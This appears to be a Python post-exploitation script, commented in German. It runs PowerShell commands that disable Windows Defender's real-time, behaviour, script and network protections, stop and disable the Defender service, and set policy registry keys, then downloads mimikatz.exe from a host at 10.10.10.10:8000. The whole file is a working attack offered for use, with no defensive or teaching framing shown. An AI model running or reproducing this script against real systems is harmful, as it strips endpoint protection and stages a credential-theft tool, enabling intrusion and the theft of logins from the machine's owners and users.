import subprocess
from urllib.request import urlretrieve

def run_powershell_command(command):
    completed = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True)
    if completed.returncode != 0:
        print(f"Error: {completed.stderr}")
    else:
        print(f"Success: {completed.stdout}")

# PowerShell commands
commands = [
    # Deaktiviert Echtzeitschutz
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    
    # Deaktiviert Verhaltensüberwachung
    "Set-MpPreference -DisableBehaviorMonitoring $true",
    
    # Deaktiviert die Überwachung des Einfügens von Skripten und Dateitypen
    "Set-MpPreference -DisableIOAVProtection $true",
    
    # Deaktiviert den Schutz vor Netzwerkangriffen
    "Set-MpPreference -DisableIntrusionPreventionSystem $true",
    
    # Deaktiviert den Schutz vor verdächtigem Netzwerkverkehr
    "Set-MpPreference -DisableScriptScanning $true",
    
    # Deaktiviert den Windows Defender Antivirus-Dienst
    "Stop-Service -Name WinDefend -Force",
    "Set-Service -Name WinDefend -StartupType Disabled",
    
    # Deaktiviert Windows Defender durch Ändern der Registrierungsschlüssel
    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" -Name "DisableAntiSpyware" -Value 1',
    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1',
    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1',
    'Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1'
]

# Execute all commands
for command in commands:
    run_powershell_command(command)

urlretrieve('http://10.10.10.10:8000/mimikatz.exe', './mimikatz.exe')
